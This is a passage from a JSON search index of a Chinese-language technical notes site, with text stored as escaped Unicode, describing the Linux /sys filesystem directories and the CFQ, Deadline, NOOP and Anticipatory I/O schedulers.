object)\u548c\u5c5e\u6027\u8fdb\u884c\u64cd\u4f5c\u548c\u89c2\u5bdf\u7684\u63a5\u53e3\uff0c\u5373\u8fd9\u91cc\u662f\u7cfb\u7edf\u52a0\u8f7d\u56fa\u4ef6\u673a\u5236\u7684\u5bf9\u7528\u6237\u7a7a\u95f4\u7684\u63a5\u53e3.(\u5173\u4e8e\u56fa\u4ef6\u6709\u4e13\u7528\u4e8e\u56fa\u4ef6\u52a0\u8f7d\u7684\u4e00\u5957API) /sys/power \u8be5\u76ee\u5f55\u4e0b\u6709\u51e0\u4e2a\u5c5e\u6027\u6587\u4ef6\u53ef\u4ee5\u7528\u4e8e\u63a7\u5236\u6574\u4e2a\u673a\u5668\u7684\u7535\u6e90\u72b6\u6001\uff0c\u5982\u5411\u5176\u4e2d\u5199\u5165\u63a7\u5236\u547d\u4ee4\u8ba9\u673a\u5668\u5173\u673a/\u91cd\u542f\u7b49\u7b49\u3002","title":"sys\u6587\u4ef6\u7cfb\u7edf"},{"location":"system/linux/IO/0sys%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/#sys","text":"/sys/devices \uff08/sys\u6587\u4ef6\u7cfb\u7edf\u6700\u91cd\u8981\u7684\u76ee\u5f55\u7ed3\u6784\uff09\u8be5\u76ee\u5f55\u4e0b\u662f\u5168\u5c40\u8bbe\u5907\u7ed3\u6784\u4f53\u7cfb\uff0c\u5305\u542b\u6240\u6709\u88ab\u53d1\u73b0\u7684\u6ce8\u518c\u5728\u5404\u79cd\u603b\u7ebf\u4e0a\u7684\u5404\u79cd\u7269\u7406\u8bbe\u5907\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u6240\u6709\u7684\u7269\u7406\u8bbe\u5907\u90fd\u6309\u5176\u5728\u603b\u7ebf\u4e0a\u7684\u62d3\u6251\u7ed3\u6784\u6765\u663e\u793a\uff0c\u4f46\u6709\u4e24\u4e2a\u4f8b\u5916\uff0c\u5373platform devices\u548csystem devices\u3002platform devices\u4e00\u822c\u662f\u6302\u5728\u82af\u7247\u5185\u90e8\u7684\u9ad8\u901f\u6216\u8005\u4f4e\u901f\u603b\u7ebf\u4e0a\u7684\u5404\u79cd\u63a7\u5236\u5668\u548c\u5916\u8bbe\uff0c\u5b83\u4eec\u80fd\u88abCPU\u76f4\u63a5\u5bfb\u5740\uff1bsystem devices\u4e0d\u662f\u5916\u8bbe\uff0c\u800c\u662f\u82af\u7247\u5185\u90e8\u7684\u6838\u5fc3\u7ed3\u6784\uff0c\u6bd4\u5982CPU\uff0ctimer\u7b49\uff0c\u5b83\u4eec\u4e00\u822c\u6ca1\u6709\u76f8\u5173\u7684\u9a71\u52a8\uff0c\u4f46\u662f\u4f1a\u6709\u4e00\u4e9b\u4f53\u7cfb\u7ed3\u6784\u76f8\u5173\u7684\u4ee3\u7801\u6765\u914d\u7f6e\u5b83\u4eec\u3002 /sys/dev \u8be5\u76ee\u5f55\u4e0b\u6709\u5b57\u7b26\u8bbe\u5907(block)\u548c\u5757\u8bbe\u5907(char)\u4e24\u4e2a\u5b50\u76ee\u5f55\uff0c\u91cc\u9762\u5168\u662f\u4ee5\u4e3b\u6b21\u8bbe\u5907\u53f7(major:minor)\u547d\u540d\u7684\u94fe\u63a5\u6587\u4ef6\uff0c\u94fe\u63a5\u5230/sys/devices\u3002 /sys/class \uff08\u6309\u529f\u80fd\u5206\u7c7b\u8bbe\u5907\uff09\u8be5\u76ee\u5f55\u4e0b\u5305\u542b\u6240\u6709\u6ce8\u518c\u5728kernel\u91cc\u9762\u7684\u8bbe\u5907\u7c7b\u578b\uff0c\u6bcf\u4e2a\u8bbe\u5907\u7c7b\u578b\u8868\u8fbe\u5177\u6709\u4e00\u79cd\u529f\u80fd\u7684\u8bbe\u5907\u3002\u6bcf\u4e2a\u8bbe\u5907\u7c7b\u578b\u5b50\u76ee\u5f55\u4e0b\u662f\u5177\u4f53\u8bbe\u5907\u7684\u7b26\u53f7\u94fe\u63a5\uff0c\u8fd9\u4e9b\u94fe\u63a5\u6307\u5411/sys/devices/...\u4e0b\u7684\u5177\u4f53\u8bbe\u5907\u3002\u8bbe\u5907\u7c7b\u578b\u548c\u8bbe\u5907\u5e76\u6ca1\u6709\u4e00\u4e00\u5bf9\u5e94\u7684\u5173\u7cfb\uff0c\u4e00\u4e2a\u7269\u7406\u8bbe\u5907\u53ef\u80fd\u5177\u5907\u591a\u79cd\u8bbe\u5907\u7c7b\u578b\uff1b\u4e00\u4e2a\u8bbe\u5907\u7c7b\u578b\u53ea\u8868\u8fbe\u5177\u6709\u4e00\u79cd\u529f\u80fd\u7684\u8bbe\u5907\uff0c\u6bd4\u5982\uff1a\u7cfb\u7edf\u6240\u6709\u8f93\u5165\u8bbe\u5907\u90fd\u4f1a\u51fa\u73b0\u5728/sys/class/input\u4e4b\u4e0b\uff0c\u800c\u4e0d\u8bba\u5b83\u4eec\u662f\u4ee5\u4f55\u79cd\u603b\u7ebf\u8fde\u63a5\u5230\u7cfb\u7edf\u7684\u3002(/sys/class\u4e5f\u662f\u6784\u6210linux\u7edf\u4e00\u8bbe\u5907\u6a21\u578b\u7684\u4e00\u90e8\u5206) /sys/block \uff08\u4ecelinux2.6.26\u7248\u672c\u5f00\u59cb\u5df2\u7ecf\u79fb\u5230\u4e86/sys/class/block\uff09 \u4ee3\u8868\u7740\u7cfb\u7edf\u4e2d\u5f53\u524d\u88ab\u53d1\u73b0\u7684\u6240\u6709\u5757\u8bbe\u5907\u3002\u6309\u7167\u529f\u80fd\u6765\u8bf4\u9632\u6b62\u5728/sys/class\u4e0b\u4f1a\u66f4\u5408\u9002\uff0c\u4f46\u7531\u4e8e\u5386\u53f2\u9057\u7559\u56e0\u7d20\u800c\u4e00\u76f4\u5b58\u5728\u4e8e/sys/block\uff0c\u4f46\u4ecelinux2.6.22\u5185\u6838\u5f00\u59cb\u8fd9\u90e8\u5206\u5c31\u5df2\u7ecf\u6807\u8bb0\u4e3a\u8fc7\u53bb\u65f6\uff0c\u53ea\u6709\u6253\u5f00\u4e86CONFIG_SYSFS_DEPRECATED\u914d\u7f6e\u7f16\u8bd1\u624d\u4f1a\u6709\u8fd9\u4e2a\u76ee\u5f55\u5b58\u5728\uff0c\u5e76\u4e14\u5176\u4e2d\u7684\u5185\u5bb9\u5728\u4ecelinux2.6.26\u7248\u672c\u5f00\u59cb\u5df2\u7ecf\u6b63\u5f0f\u79fb\u5230\u4e86/sys/class/block\uff0c\u65e7\u7684\u63a5\u53e3/sys/block\u4e3a\u4e86\u5411\u540e\u517c\u5bb9\u800c\u4fdd\u7559\u5b58\u5728\uff0c\u4f46\u5176\u4e2d\u7684\u5185\u5bb9\u5df2\u7ecf\u53d8\u4e3a\u4e86\u6307\u5411\u5b83\u4eec\u5728/sys/devices/\u4e2d\u771f\u5b9e\u8bbe\u5907\u7684\u7b26\u53f7\u94fe\u63a5\u6587\u4ef6\u3002 /sys/bus \uff08\u6309\u603b\u7ebf\u7c7b\u578b\u5206\u7c7b\u8bbe\u5907\uff09\u4e00\u822c\u6765\u8bf4\u6bcf\u4e2a\u5b50\u76ee\u5f55(\u603b\u7ebf\u7c7b\u578b)\u4e0b\u5305\u542b\u4e24\u4e2a\u5b50\u76ee\u5f55\uff0c\u4e00\u4e2a\u662fdevices\uff0c\u53e6\u4e00\u4e2a\u662fdrivers\uff1b\u5176\u4e2ddevices\u4e0b\u662f\u8fd9\u4e2a\u603b\u7ebf\u7c7b\u578b\u4e0b\u7684\u6240\u6709\u8bbe\u5907\uff0c\u8fd9\u4e9b\u8bbe\u5907\u90fd\u662f\u7b26\u53f7\u94fe\u63a5\uff0c\u5b83\u4eec\u5206\u522b\u6307\u5411\u771f\u6b63\u7684\u8bbe\u5907(/sys/devices/...\u4e0b)\uff1b\u800cdrivers\u4e0b\u662f\u6240\u6709\u6ce8\u518c\u5728\u8fd9\u4e2a\u603b\u7ebf\u4e0a\u7684\u9a71\u52a8\uff0c\u6bcf\u4e2adriver\u5b50\u76ee\u5f55\u4e0b \u662f\u4e00\u4e9b\u53ef\u4ee5\u89c2\u5bdf\u548c\u4fee\u6539\u7684driver\u53c2\u6570\u3002 (\u5b83\u4e5f\u662f\u6784\u6210linux\u7edf\u4e00\u8bbe\u5907\u6a21\u578b\u7684\u4e00\u90e8\u5206) /sys/module \u8be5\u76ee\u5f55\u5305\u542b\u6240\u6709\u88ab\u8f7d\u5165Kernel\u7684\u6a21\u5757\uff0c\u65e0\u8bba\u8fd9\u4e9b\u6a21\u5757\u662f\u4ee5\u5185\u8054(inlined)\u65b9\u5f0f\u7f16\u8bd1\u5230\u5185\u6838\u6620\u50cf\u6587\u4ef6\u4e2d\u8fd8\u662f\u7f16\u8bd1\u4e3a\u5916\u6a21\u5757(.ko\u6587\u4ef6) /sys/fs \u8be5\u76ee\u5f55\u7528\u6765\u63cf\u8ff0\u7cfb\u7edf\u4e2d\u6240\u6709\u7684\u6587\u4ef6\u7cfb\u7edf\uff0c\u5305\u62ec\u6587\u4ef6\u7cfb\u7edf\u672c\u8eab\u548c\u6309\u7167\u6587\u4ef6\u7cfb\u7edf\u5206\u7c7b\u5b58\u653e\u7684\u5df2\u6302\u8f7d\u70b9\u3002 /sys/kernel \u8be5\u76ee\u5f55\u4e0b\u5b58\u653e\u7684\u662f\u5185\u6838\u4e2d\u6240\u6709\u53ef\u8c03\u6574\u7684\u53c2\u6570 /sys/firmware \u8be5\u76ee\u5f55\u4e0b\u5305\u542b\u5bf9\u56fa\u4ef6\u5bf9\u8c61(firmware object)\u548c\u5c5e\u6027\u8fdb\u884c\u64cd\u4f5c\u548c\u89c2\u5bdf\u7684\u63a5\u53e3\uff0c\u5373\u8fd9\u91cc\u662f\u7cfb\u7edf\u52a0\u8f7d\u56fa\u4ef6\u673a\u5236\u7684\u5bf9\u7528\u6237\u7a7a\u95f4\u7684\u63a5\u53e3.(\u5173\u4e8e\u56fa\u4ef6\u6709\u4e13\u7528\u4e8e\u56fa\u4ef6\u52a0\u8f7d\u7684\u4e00\u5957API) /sys/power \u8be5\u76ee\u5f55\u4e0b\u6709\u51e0\u4e2a\u5c5e\u6027\u6587\u4ef6\u53ef\u4ee5\u7528\u4e8e\u63a7\u5236\u6574\u4e2a\u673a\u5668\u7684\u7535\u6e90\u72b6\u6001\uff0c\u5982\u5411\u5176\u4e2d\u5199\u5165\u63a7\u5236\u547d\u4ee4\u8ba9\u673a\u5668\u5173\u673a/\u91cd\u542f\u7b49\u7b49\u3002","title":"/sys \u6587\u4ef6\u7cfb\u7edf"},{"location":"system/linux/IO/IO%20scheduler/","text":"IO\u8c03\u5ea6 IO \u8c03\u5ea6\u5668\u7684\u603b\u4f53\u76ee\u6807\u662f\u51cf\u5c11\u78c1\u76d8\u7684\u5bfb\u9053\u65f6\u95f4\uff08\u56e0\u6b64\u8c03\u5ea6\u5668\u90fd\u662f\u9488\u5bf9\u673a\u68b0\u786c\u76d8\u8fdb\u884c\u4f18\u5316\u7684\uff09\uff0cIO \u8c03\u5ea6\u5668\u901a\u8fc7\u4e24\u79cd\u65b9\u5f0f\u6765\u51cf\u5c11\u78c1\u76d8\u5bfb\u9053\uff1a\u5408\u5e76\u548c\u6392\u5e8f\u3002 \u5408\u5e76\u5373\u5f53\u4e24\u4e2a\u6216\u591a\u4e2a IO \u8bf7\u6c42\u7684\u662f\u76f8\u90bb\u7684\u78c1\u76d8\u6247\u533a\uff0c\u90a3\u4e48\u5c31\u5c06\u8fd9\u4e9b\u8bf7\u6c42\u5408\u5e76\u4e3a\u4e00\u4e2a\u8bf7\u6c42\u3002\u901a\u8fc7\u5408\u5e76\u8bf7\u6c42\uff0c\u591a\u4e2a IO \u8bf7\u6c42\u53ea\u9700\u8981\u5411\u78c1\u76d8\u53d1\u9001\u4e00\u4e2a\u8bf7\u6c42\u6307\u4ee4\uff0c\u51cf\u5c11\u4e86\u78c1\u76d8\u7684\u5f00\u9500\u3002 \u6392\u5e8f\u5c31\u662f\u5c06\u4e0d\u80fd\u5408\u5e76\u7684 IO \u8bf7\u6c42\uff0c\u6839\u636e\u8bf7\u6c42\u78c1\u76d8\u6247\u533a\u7684\u987a\u5e8f\uff0c\u5728\u8bf7\u6c42\u961f\u5217\u4e2d\u8fdb\u884c\u6392\u5e8f\uff0c\u4f7f\u5f97\u78c1\u5934\u53ef\u4ee5\u6309\u7167\u78c1\u76d8\u7684\u65cb\u8f6c\u987a\u5e8f\u7684\u5b8c\u6210 IO \u64cd\u4f5c\uff0c\u53ef\u4ee5\u51cf\u5c0f\u78c1\u76d8\u7684\u5bfb\u9053\u6b21\u6570\u3002 \u8c03\u5ea6\u5668\u7684\u7b97\u6cd5\u548c\u7535\u68af\u8fd0\u884c\u7684\u7b56\u7565\u76f8\u4f3c\uff0c\u56e0\u6b64 IO \u8c03\u5ea6\u5668\u4e5f\u88ab\u79f0\u4f5c IO \u7535\u68af( IO Elevator )\u3002\u7531\u4e8e\u5bf9\u8bf7\u6c42\u8fdb\u884c\u4e86\u91cd\u6392\uff0c\u4e00\u90e8\u5206\u7684\u8bf7\u6c42\u53ef\u80fd\u4f1a\u88ab\u5ef6\u8fdf\uff0c\u4ee5\u63d0\u5347\u6574\u4f53\u7684\u6027\u80fd\u3002 Linux 2.4 \u53ea\u4f7f\u7528\u4e86\u4e00\u79cd\u901a\u7528\u7684 IO \u7b97\u6cd5\u3002\u5230 Linux 2.6 \u5b9e\u73b0\u4e86 4 \u79cd IO \u8c03\u5ea6\u6a21\u578b\uff0c\u5176\u4e2d anticipatory \u5728 2.6.33 \u4e2d\u88ab\u79fb\u9664\u3002 I/O\u8c03\u5ea6\u7b97\u6cd5 Complete Fair Queuing\uff08CFQ\uff09- fairness-oriented Note CFQ \u4e3a\u6bcf\u4e2a\u8fdb\u7a0b\u5206\u914d\u4e00\u4e2a I/O \u8bf7\u6c42\u961f\u5217\uff0c\u5728\u6bcf\u4e2a\u961f\u5217\u7684\u5185\u90e8\uff0c\u8fdb\u884c\u5408\u5e76\u548c\u6392\u5e8f\u7684\u4f18\u5316\u3002CFQ \u4ee5\u8f6e\u8be2\u7684\u65b9\u5f0f\u5904\u7406\u8fd9\u4e9b\u961f\u5217\uff0c\u6bcf\u6b21\u4ece\u4e00\u4e2a\u961f\u5217\u4e2d\u5904\u7406\u7279\u5b9a\u6570\u91cf\u7684\u8bf7\u6c42\uff08\u9ed8\u8ba4\u4e3a 4 \u4e2a\uff09\u3002\u5b83\u8bd5\u56fe\u5c06 I/O \u5e26\u5bbd\u5747\u5300\u7684\u5206\u914d\u81f3\u6bcf\u4e2a\u8fdb\u7a0b\u3002CFQ \u539f\u672c\u9488\u5bf9\u7684\u662f\u591a\u5a92\u4f53\u6216\u684c\u9762\u5e94\u7528\u573a\u666f\uff0c\u7136\u800c\uff0cCFQ \u5176\u5b9e\u5728\u8bb8\u591a\u573a\u666f\u4e2d\u5185\u8868\u73b0\u7684\u5f88\u597d\u3002CFQ \u5bf9\u6bcf\u4e00\u4e2a IO \u8bf7\u6c42\u90fd\u662f\u516c\u5e73\u7684\u3002\u8fd9\u4f7f\u5f97 CFQ \u5f88\u9002\u5408\u79bb\u6563\u8bfb\u7684\u5e94\u7528 (eg: OLTP DB)\u3002\u591a\u6570\u4f01\u4e1a\u53d1\u578b\u7248\u9009\u62e9 CFQ \u4f5c\u4e3a\u9ed8\u8ba4\u7684 I/O \u8c03\u5ea6\u5668\u3002 Deadline - latency-oriented Note Deadline \u8c03\u5ea6\u5668\u662f\u8bbe\u8ba1\u7528\u6765\u89e3\u51b3 Linus Elevator \u5bfc\u81f4\u7684 I/O \u997f\u6b7b\u7684\u95ee\u9898\u3002\u5bf9\u78c1\u76d8\u4e0a\u67d0\u4e2a\u533a\u57df\u7684\u5927\u91cf\u8bf7\u6c42\uff0c\u4f1a\u65e0\u9650\u671f\u7684\u997f\u6b7b (starvation) \u5bf9\u78c1\u76d8\u5176\u4ed6\u533a\u57df\u4e0a\u7684\u8bf7\u6c42\u3002\u8bf7\u6c42\u997f\u6b7b\u7684\u4e00\u4e2a\u7279\u4f8b\u662f \u5199\u8bf7\u6c42\u997f\u6b7b\u8bfb\u8bf7\u6c42 (writes starving reads)\uff0c\u5bf9\u4e8e\u8fdb\u7a0b\u6765\u8bf4\uff0c\u5f53\u9700\u8981\u8fdb\u884c\u5199\u64cd\u4f5c\u65f6\uff0c\u7531\u4e8e\u9700\u8981\u5199\u7684\u6570\u636e\u5728\u5185\u5b58\u7684 page cache \u4e2d\uff0c\u8fdb\u7a0b\u662f\u9700\u8981\u4fee\u6539\u5bf9\u5e94\u7684\u5185\u5b58\uff0c\u5411\u5185\u6838\u53d1\u9001\u5199\u8bf7\u6c42\u5373\u53ef\uff0c\u4e4b\u540e\u8fdb\u7a0b\u53ef\u4ee5\u53bb\u8fdb\u884c\u5176\u4ed6\u64cd\u4f5c\uff0c\u7531\u5185\u6838\u8d1f\u8d23\u5c06\u6570\u636e\u540c\u6b65\u81f3\u78c1\u76d8\u4e2d\u5373\u53ef\u3002\u5bf9\u4e8e\u8fdb\u7a0b\u6765\u8bf4\uff0c\u5199\u8bf7\u6c42\u662f\u5f02\u6b65\u64cd\u4f5c\u3002\u800c\u8bfb\u64cd\u4f5c\u662f\u5b8c\u5168\u4e0d\u540c\u7684\uff0c\u5f53\u8fdb\u7a0b\u9700\u8981\u8bfb\u53d6\u6570\u636e\u65f6\uff0c\u9700\u8981\u5411\u5185\u6838\u53d1\u9001\u8bfb\u8bf7\u6c42\uff0c\u5185\u6838\u5c06\u6570\u636e\u8f7d\u5165\u5230\u5185\u5b58\u4e2d\uff0c\u7531\u4e8e\u8fdb\u7a0b\u5f80\u5f80\u9700\u8981\u5904\u7406\u8bfb\u53d6\u7684\u6570\u636e\uff0c\u56e0\u6b64\u8fdb\u7a0b\u5c06\u5904\u4e8e\u963b\u585e\u72b6\u6001\uff0c\u76f4\u5230\u8bf7\u6c42\u88ab\u5904\u7406\u5b8c\u6210\u3002\u5bf9\u4e8e\u8fdb\u7a0b\u6765\u8bf4\uff0c\u8bfb\u8bf7\u6c42\u662f\u540c\u6b65\u7684\u64cd\u4f5c\u3002\u5199\u8bf7\u6c42\u5ef6\u8fdf\u5bf9\u7cfb\u7edf\u7684\u6027\u80fd\u5f71\u54cd\u4e0d\u5927\uff0c\u800c\u8bfb\u8bf7\u6c42\u5ef6\u8fdf\u5bf9\u7cfb\u7edf\u6027\u80fd\u5f71\u54cd\u662f\u975e\u5e38\u5927\u7684\uff0c\u56e0\u6b64\u4e24\u79cd IO \u8bf7\u6c42\u9700\u8981\u533a\u522b\u5bf9\u5f85\u3002 Dealine \u8c03\u5ea6\u5668\u4e13\u95e8\u9488\u5bf9\u8bfb\u8bf7\u6c42\u5ef6\u8fdf\u8fdb\u884c\u4e86\u4f18\u5316\uff0c\u5728 deadline \u7b97\u6cd5\u4e2d\uff0c\u6bcf\u4e00\u4e2a\u8bf7\u6c42\u90fd\u6709\u4e00\u4e2a\u8fc7\u671f\u65f6\u95f4\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u8bfb\u8bf7\u6c42\u7684\u8fc7\u671f\u65f6\u95f4\u662f 500ms\uff0c\u5199\u8bf7\u6c42\u7684\u8fc7\u671f\u65f6\u95f4\u662f 5s\u3002Dealine \u8c03\u5ea6\u5668\u4e5f\u4f1a\u5bf9\u8bf7\u6c42\u961f\u5217\u8fdb\u884c\u5408\u5e76\u548c\u6392\u5e8f\u64cd\u4f5c\uff0c\u8fd9\u4e2a\u961f\u5217\u79f0\u4f5c\u6392\u5e8f\u961f\u5217\uff08sorted queue\uff09\u3002\u5f53\u65b0\u8bf7\u6c42\u88ab\u63d0\u4ea4\uff0cDeadline\u5c06\u5176\u52a0\u5165\u5230\u6392\u5e8f\u961f\u5217\u4e2d\u8fdb\u884c\u5408\u5e76\u548c\u6392\u5e8f\u3002\u540c\u65f6 Deadline \u5c06\u8fd9\u4e2a\u8bf7\u6c42\u52a0\u5165\u5230\u7b2c\u4e8c\u79cd\u7c7b\u578b\u7684\u961f\u5217\u4e2d\uff0c\u8bfb\u8bf7\u6c42\u88ab\u52a0\u5165\u81f3\u8bfbFIFO\u961f\u5217 (Read FIFO queue)\uff0c\u5199\u8bf7\u6c42\u88ab\u52a0\u5165\u5230\u5199FIFO\u961f\u5217 (Write FIFO queue)\uff0c\u8fd9\u4e24\u4e2a\u961f\u5217\u4e2d\uff0c\u8bf7\u6c42\u5b8c\u5168\u6309\u7167 FIFO \u987a\u5e8f\u6392\u5217\uff0c\u5373\u65b0\u8bf7\u6c42\u6c38\u8fdc\u88ab\u653e\u5165\u5230\u961f\u5217\u7684\u672b\u5c3e\u3002\u8fd9\u6837\u4e00\u6765 Dealine \u5c31\u7ef4\u62a4\u4e09\u4e2a\u961f\u5217\uff0c\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0cDeadline \u5c06\u6392\u5e8f\u961f\u5217\u4e2d\u7684\u8bf7\u6c42\u653e\u5165\u5230\u8c03\u5ea6\u961f\u5217 (dispatch queue\uff0c\u5373\u5c06\u5199\u5165\u78c1\u76d8\u7684\u961f\u5217)\u4e2d\uff0c\u8c03\u5ea6\u961f\u5217\u628a\u8bf7\u6c42\u53d1\u9001\u81f3\u78c1\u76d8\u9a71\u52a8\u3002\u5982\u679c\u5199 FIFO \u961f\u5217\u6216\u8bfb FIFO \u961f\u5217\u4e2d\u7684\u8bf7\u6c42\u53d1\u751f\u4e86\u8d85\u65f6\uff0cDeadline \u8c03\u5ea6\u5668\u5c31\u4e0d\u518d\u4f7f\u7528\u6392\u5e8f\u961f\u5217\uff0c\u800c\u662f\u5f00\u59cb\u5c06\u53d1\u751f\u8d85\u65f6\u7684 FIFO \u961f\u5217\u7684\u8bf7\u6c42\u653e\u5165\u8c03\u5ea6\u961f\u5217\uff0c\u76f4\u81f3\u961f\u5217\u4e2d\u6ca1\u6709\u8d85\u65f6\u7684\u8bf7\u6c42\uff0cDeadline \u901a\u8fc7\u8fd9\u6837\u7684\u65b9\u5f0f\u4fdd\u8bc1\u6240\u6709\u7684\u8bf7\u6c42\u90fd\u4e0d\u4f1a\u957f\u65f6\u95f4\u8d85\u65f6\u3002 Deadling \u9632\u6b62\u4e86\u8bf7\u6c42\u997f\u6b7b\u7684\u51fa\u73b0\uff0c\u7531\u4e8e\u8bfb\u8bf7\u6c42\u7684\u8d85\u65f6\u65f6\u95f4\u8fdc\u5c0f\u4e8e\u5199\u8bf7\u6c42\uff0c\u5b83\u540c\u65f6\u4e5f\u907f\u514d\u4e86\u51fa\u73b0\u5199\u8bf7\u6c42\u997f\u6b7b\u8bfb\u8bf7\u6c42\u3002 Deadline \u6bd4\u8f83\u9002\u5408\u4e8eMySQL\u6570\u636e\u5e93\u3002 deadline\uff08\u622a\u6b62\u65f6\u95f4\u8c03\u5ea6\u7a0b\u5e8f\uff09 \u6700\u540e\u671f\u9650\uff0c\u9884\u671f\u7684\u65f6\u95f4\u5fc5\u987b\u5b8c\u6210\u3002\u5177\u6709\u5b9e\u65f6\u6027\uff0c \u5f53\u6709\u4e00\u4e2aI/O\u8bf7\u6c42\uff0c\u4e00\u5b9a\u4f1a\u5728\u6307\u5b9a\u65f6\u95f4\u59825ms\u4e4b\u5185\u5b8c\u6210\u3002 \u4f5c\u4e3a\u865a\u62df\u673a\u7684\u7269\u7406\u673a(virtualization host)\uff0c\u4f7f\u7528deadline\u53ef\u4ee5\u8ba9\u6240\u6709\u7684\u865a\u62df\u673a\u5f97\u5230I/O\u8bf7\u6c42\u3002 NOOP(No Operation) Note \u8be5\u7b97\u6cd5\u5b9e\u73b0\u4e86\u6700\u7b80\u5355\u7684 FIFO \u961f\u5217\uff0c\u6240\u6709 IO \u8bf7\u6c42\u6309\u7167\u5927\u81f4\u7684\u5148\u540e\u987a\u5e8f\u8fdb\u884c\u64cd\u4f5c\u3002\u4e4b\u6240\u4ee5\u8bf4\u300c\u5927\u81f4\u300d\uff0c\u539f\u56e0\u662f NOOP \u5728 FIFO \u7684\u57fa\u7840\u4e0a\u8fd8\u505a\u4e86\u76f8\u90bb IO \u8bf7\u6c42\u7684\u5408\u5e76\uff0c\u4f46\u5176\u4e0d\u4f1a\u8fdb\u884c\u6392\u5e8f\u64cd\u4f5c\u3002 NOOP \u9002\u7528\u4e8e\u5e95\u5c42\u786c\u4ef6\u81ea\u8eab\u5c31\u5177\u6709\u5f88\u5f3a\u8c03\u5ea6\u63a7\u5236\u5668\u7684\u5757\u8bbe\u5907\uff08\u5982\u67d0\u4e9bSAN\u8bbe\u5907\uff09\uff0c\u6216\u8005\u5b8c\u5168\u968f\u673a\u8bbf\u95ee\u7684\u5757\u8bbe\u5907\uff08\u5982SSD\uff09\u3002 \u5404\u4e2a\u8c03\u5ea6\u5668\u5728\u6570\u636e\u5e93\u5e94\u7528\u4e0b\u7684\u6027\u80fd\uff0c\u53ef\u4ee5\u770b\u51faCFQ\u7684\u6027\u80fd\u662f\u6bd4\u8f83\u5747\u8861\u7684 (\u7535\u68af\u5f0f\u8c03\u5ea6\u7a0b\u5e8f) \u54cd\u5e94\u5f88\u5feb\uff0cCPU\u4e0d\u7528\u8d39\u65f6\uff0c\u4f4e\u5f00\u9500\uff0c\u4e5f\u5c31\u662f\u4e0d\u7528\u8c03\u5ea6\u3002\u9002\u5408\u4e8eSSD\u78c1\u76d8\uff0c\u4e0d\u7528\u5408\u5e76\u3002\u00df \u9002\u5408\u4e8e\u865a\u62df\u673avirtualization guests\uff0c\u56e0\u4e3a\u5199\u6570\u636e\u6700\u7ec8\u662f\u865a\u62df\u673a\u7ba1\u7406\u5668\uff08\u4e0a\u5c42\uff09\u6765\u5199\uff0c\u6240\u4ee5\u865a\u62df\u673a\u4e0d\u9700\u8981\u8c03\u5ea6 Anticipatory(AS) Note AS \u8c03\u5ea6\u5668\u662f\u57fa\u4e8e Deadline \u8c03\u5ea6\u5668\uff0c\u52a0\u4e0a\u4e86\u4e00\u4e2a\u542f\u53d1\u5f0f\u7684\u300c\u9884\u6d4b\u300d\uff0c\u5047\u8bbe\u7cfb\u7edf\u4e2d\u6709\u5927\u91cf\u7684\u5199\u8bf7\u6c42\uff0c\u8fd9\u65f6\u5982\u679c\u5939\u6742\u51e0\u4e2a\u8bfb\u8bf7\u6c42\uff0c\u7531\u4e8e\u8bfb\u8bf7\u6c42\u7684\u8fc7\u671f\u65f6\u95f4\u77ed\uff0c\u8bfb\u8bf7\u6c42\u7acb\u5373\u5728\u591a\u4e2a\u5199\u8bf7\u6c42\u7684\u4e2d\u95f4\u4ea7\u751f\uff0c\u8fd9\u6837\u4f1a\u5bfc\u81f4\u78c1\u76d8\u7684\u6765\u56de\u5bfb\u9053\uff0cAS \u8bd5\u56fe\u51cf\u5c11\u5927\u91cf\u5199\u8bf7\u6c42\u5939\u6742\u5c11\u91cf\u8bfb\u8bf7\u6c42\u4ea7\u751f\u7684\u5bfb\u9053\u98ce\u66b4\uff08seek storm\uff09\u3002\u5f53\u4e00\u4e2a\u8bfb\u8bf7\u6c42\u5b8c\u6210\u540e\uff0cAS\u4e0d\u4f1a\u7acb\u5373\u8fd4\u56de\u5904\u7406\u961f\u5217\u4e2d\u7684\u5269\u4f59\u8bf7\u6c42\uff0c\u800c\u662f\u7b49\u5f85\u4e00\u4e2a\u9884\u6d4b\u65f6\u95f4\uff08\u9ed8\u8ba4\u4e3a 6ms\uff09\uff0c\u5982\u679c\u7b49\u5f85\u7684\u65f6\u95f4\u5185\u53d1\u751f\u4e86\u76f8\u90bb\u4f4d\u7f6e\u7684\u8bfb\u8bf7\u6c42\uff0c\u90a3\u4e48\u7acb\u5373\u5904\u7406\u8fd9\u4e2a\u76f8\u90bb\u4f4d\u7f6e\u7684\u8bfb\u8bf7\u6c42\uff0c\u518d\u8fd4\u56de\u5904\u7406\u961f\u5217\u4e2d\u7684\u8bf7\u6c42\uff0c\u8fd9\u6837\u53ef\u4ee5\u4f18\u5316\u591a\u4f59\u7684\u5bfb\u9053\u65f6\u95f4\u3002 \u5b83\u53ef\u4ee5\u4e3a\u8fde\u7eed IO \u8bf7\u6c42\uff08\u5982\u987a\u5e8f\u8bfb\uff09\u8fdb\u884c\u4e86\u4e00\u5b9a\u7684\u4f18\u5316\uff0c\u4f46\u662f\u5bf9\u4e8e\u968f\u673a\u8bfb\u7684\u573a\u666f AS \u4f1a\u4ea7\u751f\u8f83\u5927\u7684\u5ef6\u8fdf\uff0c\u5bf9\u4e8e\u6570\u636e\u5e93\u5e94\u7528\u5f88\u7cdf\u7cd5\uff0c\u800c\u5bf9\u4e8e Web Server \u53ef\u80fd\u4f1a\u8868\u73b0\u7684\u4e0d\u9519\u3002\u8fd9\u4e2a\u7b97\u6cd5\u4e5f\u53ef\u4ee5\u7b80\u5355\u7406\u89e3\u4e3a\u9762\u5411\u4f4e\u901f\u78c1\u76d8\u7684\uff0c\u5bf9\u4e8e\u4f7f\u7528\u4e86 TCG\uff08Tagged Command Queueing\uff09\u9ad8\u6027\u80fd\u7684\u78c1\u76d8\u548c RAID\uff0c\u4f7f\u7528 AS \u4f1a\u964d\u4f4e\u6027\u80fd\u3002 \u5728 Linux 2.6 - 2.6.18 AS \u662f\u5185\u6838\u9ed8\u8ba4\u8c03\u5ea6\u5668\uff0c\u7136\u800c\u5927\u591a\u6570\u7684\u4f01\u4e1a\u53d1\u884c\u7248\u9009\u62e9\u7684\u662f CFQ \u8c03\u5ea6\u5668\u3002 \u5230Linux 2.6.33 \u7248\u672c\uff0cAS 